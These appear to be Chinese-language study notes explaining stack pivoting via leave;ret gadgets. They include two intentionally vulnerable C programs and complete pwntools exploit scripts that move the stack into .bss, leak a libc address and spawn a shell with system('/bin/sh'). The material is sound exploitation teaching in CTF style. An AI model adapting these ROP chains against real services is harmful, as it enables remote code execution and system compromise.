## 原理
劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行 ROP。一般来说，我们可能在以下情况需要使用 stack pivoting

- 可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链
- 开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域。
- 其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用

此外，利用 stack pivoting 有以下几个要求

- 可以控制程序执行流。
    
- 可以控制 sp 指针。一般来说，控制栈指针会使用 ROP，常见的控制栈指针的 gadgets 一般是
```asm
pop rsp/esp
```

`leave; ret`时的行为：
1. `RSP` 移到 `RBP` 的位置（`mov rsp, rbp`）
2. `RBP` 返回上一个栈帧的栈底（`pop rbp`）
3. `RIP` 返回 `call` 指令之后继续执行（`pop rip`）

一句话`leave`控制`RBP`寄存器，然后再次通过`leave`控制`RSP`寄存器。
`leave` 总是会：
- **ESP跳到老的 EBP 指向的地方**
- **再吃掉一个值作为新的 EBP**

# 为什么一次 leave 不够？

因为：
- 第一次 leave：
    - 只能修改 **EBP**
    - RSP 被设置为 old EBP，但 **无法控制此时 RSP 的内容（RIP 还在老的地方）**
        

如果想控制 **RSP→任意地址**（即栈迁移到你布置好的 ROP 链上），则必须：

- 第一次 leave → **将 EBP 修改成想迁移到的 RSP 地址 a**
- 第二次 leave → 将 RSP ← a，同时弹一个新 EBP，再 ret 跳到 a 里的 ROP 开始执行


## 例子1


C源码：
```c
// gcc test.c -no-pie -fno-stack-protector -g
#include <stdio.h>

char buf[0x1000];

int main() {
    char str[0x20];
    puts("Read 1");

    read(0, buf, 0x1000);

    puts("Read 2");

    read(0, str, 0x30);

    return 0;
}
```

编译结果:
![[Pasted image 20251114092854.png]]

我们选取.bss段写入我们的ROP，以进行栈迁移。

第一次`read`是 `0x00404060` 处的内存。(`buf`为全局变量，存在.bss段)

![[Pasted image 20251114092949.png]]

因此我们可以选择在`0x404060+0xE00`处构造我们的ROP链
为什么需要加`0xE00`偏移？
0xE00 距离 `.bss` 起点够远。不能选：
- `.bss` 起始（有全局变量）
- `.bss` 太靠近结尾（可能越界）
- `.data` 里（程序可能会写）
第一次read的`buf`数组够大，因此选择第一次read的时候进行构造
对应的exp代码为：
```python
payload = flat({
	0xE00:[ 
		p64(0xdeadbeef), 
		p64(pop_rdi), 
		p64(puts_got), 
		p64(puts_plt),
		p64(main_addr)
   ] 
   })
```

接下来我们利用`leave ;ret`进行栈偏移，对`ret addr`进行覆盖
选择第二次read的时候进行构造
对应的exp代码为:
```python
payload = flat({ 0x20: [ p64(0x404E60), p64(leave_ret), ] })
```

详细解释：
程序片段分析
```C
char str[0x20];      // 栈上 buffer

read(0, str, 0x30);  // 溢出

return 0;

```
溢出范围：
```asm
str:        0x20 bytes
saved rbp:  0x8 bytes
ret addr:   0x8 bytes
-----------------------
total = 0x30 bytes     ← 正好允许覆盖 ret 地址

```
第二次read执行后的栈布局：
```lua
         ↑ 高地址
+---------------------------+
| return address of main    |  ← 用leave_ret addr覆盖
+---------------------------+
| saved RBP                 | ← 写入0x404E60
+---------------------------+
| str[31:16]                |  ← padding
+---------------------------+
| str[15:0]                 |  ← padding
+---------------------------+
         ↓ 低地址

```
由于覆盖了 saved RBP，因此rbp = 0x404E60
执行 `leave`：
1. `move rsp, rbp` -> rsp = 0x404E60      
2. `pop rbp` :
```asm
	rbp = *(rsp)   ← 0x404E60 处的值
	rsp = rsp + 8
```
在 .bss+0xE00 的 ROP 链开头放了一个`p64(0xdeadbeef)`,因此寄存器现在的状态为
```asm
rbp = 0xdeadbeef
rsp = 0x404E68
```
然后执行`ret`,即`pop rip`
```asm
rip = *(rsp)   ← 0x404E68 处的数据
rsp = rsp + 8
```
此时rip跳转到0x404E68开始执行ROP链

完整的exp脚本如下：
```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-

from pwn import *

context.log_level = "debug"
context.terminal = ["konsole", "-e"]
context.arch = "amd64"

p = process("./a.out")

elf = ELF("./a.out")
libc = ELF("./libc-2.31.so")

pop_rdi   = 0x0000000000401223
leave_ret = 0x00000000004011b5
ret       = 0x000000000040101a

puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]

main_addr = elf.sym["main"]

payload = flat({
    0xE00:[
        p64(0xdeadbeef),        # padding
        p64(pop_rdi),
        p64(puts_got),
        p64(puts_plt),
        p64(main_addr)
    ]
})

p.sendafter(b"Read 1\n", payload)

payload = flat({
    0x20: [
        p64(0x404E60),
        p64(leave_ret),
    ]
})

p.sendafter(b"Read 2\n", payload)

puts_addr = u64(p.recv(6).ljust(8, b"\x00"))
log.success("puts_addr: " + hex(puts_addr))
libc_base = puts_addr - libc.sym["puts"]
log.success("libc_base: " + hex(libc_base))

pop_rsi     = libc_base + 0x000000000002601f
pop_rdx_r12 = libc_base + 0x0000000000119431
binsh_addr  = libc_base + next(libc.search(b"/bin/sh"))
system_addr = libc_base + libc.sym["system"]

payload = flat({
    0x600: [
        p64(0xdeadbeef),        # padding
        p64(pop_rdi),
        p64(binsh_addr),
        p64(ret),
        p64(system_addr),
    ]
})

gdb.attach(p)
p.sendafter(b"Read 1\n", payload)

payload = flat({
    0x20: [
        p64(0x404660),
        p64(leave_ret),
    ]
})

p.sendafter(b"Read 2\n", payload)


p.interactive()
```

## 例子2

#### 源码：
```C
// gcc test.c -no-pie -fno-stack-protector -g
#include <stdio.h>

char buf[0x3000]; // 让.bss有足够的空间。

int main() {
    char str[0x1000];
    puts("Read 1");

    read(0, str, 0x1010);

    return 0;
}
```

这里只有一次往 `rbp-0x1000` 的位置写入 0x1010 长度的内容的机会。很显然，这里无法提供足够的空间构造 ROP 链，也没机会提前写入 ROP 链。
我们可以通过函数结尾 `leave` 控制 `RBP` 寄存器，然后通过再次 `leave` 控制 `RSP` 寄存器。

#### 完整exp代码：
```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-

from pwn import *

context.log_level = "debug"
context.terminal = ["konsole", "-e"]
context.arch = "amd64"

p = process("./a.out")

elf = ELF("./a.out")
libc = ELF("./libc-2.31.so")

pop_rdi   = 0x0000000000401203
leave_ret = 0x0000000000401199
ret       = 0x000000000040101a

puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]

main_addr = elf.sym["main"]

read_addr = 0x00401176

payload = flat({
    0x1000: [
        p64(0x00405500),
        p64(read_addr)
    ]
})

p.sendafter(b"Read 1\n", payload)

payload = flat({
    0x00: [
        p64(0xdeadbeef),
        p64(pop_rdi),
        p64(puts_got),
        p64(puts_plt),
    ],
    0x1000: [
        p64(0x00404500),
        p64(leave_ret),
    ]
})

p.send(payload)

puts_addr = u64(p.recv(6).ljust(8, b"\x00"))
log.success("puts_addr: " + hex(puts_addr))
libc_base = puts_addr - libc.sym["puts"]
log.success("libc_base: " + hex(libc_base))

p.interactive()
```

#### 整体过程详细解释：
- 第一次 `read(0, str, 0x1010)` 溢出，**覆盖 saved RBP 和 saved RIP**，把保存的 RBP 改为一个 `.bss`（或任意可写段）地址（这里 `0x00405500`），把返回地址改为某个会再做 `read` 的地址（`read_addr`）。
    
- 当 `main` 执行到函数尾的 **`leave; ret`** 时，会把 `RBP` 弹出为我们写入的 `.bss` 地址，从而完成第一次 _stack-pivot_（把 `RBP` 设置为 `.bss`）。`ret` 跳到 `read_addr`，程序执行第二次读取，我们把第二阶段数据写到以新 `RBP` 为基准的内存（也就是 `.bss`）中。
    
- 第二阶段构造：在 `.bss` 的低地址处放真正的 ROP 链（如 `pop rdi; puts@plt; ...`），并在 `.bss` 的某个偏移再放一个新的 saved RBP（例如 `0x00404500`）和一个 `leave; ret` gadget。
    
- 利用第二次 `leave` 再次 pivot（把 `RSP` 指向 `.bss`，`pop rbp` 为 `0x00404500`，`ret` 跳到放在 `.bss` 的 ROP 链入口），最后执行 ROP 链泄露 libc 并拿到 shell（或下一步 payload）。





<font size=5>注意:main函数返回时，本身就要执行leave;ret，因此此时栈溢出覆盖ret地址为leave;ret相当于执行了两次leave;ret</font>



